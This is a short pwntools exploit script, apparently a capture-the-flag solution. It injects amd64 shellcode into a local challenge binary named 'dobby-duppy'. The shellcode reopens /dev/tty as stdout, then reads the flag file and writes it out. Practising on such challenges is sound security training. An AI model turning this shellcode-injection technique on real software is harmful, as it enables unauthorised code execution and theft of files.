from pwn import *

context.arch = "amd64"

rem = process("./Pwnable/dobby-duppy/problem/chall")

payload = asm(shellcraft.open("/dev/tty", flags=os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode=0o644) + shellcraft.dup2('rax', 1) + shellcraft.open("./Pwnable/dobby-duppy/problem/flag", 0) + shellcraft.write(1, "rax", 0x100))
# print(len(payload))
rem.sendlineafter(b":) ", payload)
rem.recvuntil(b"bliiiiiiiiind\n")
print(rem.recvall())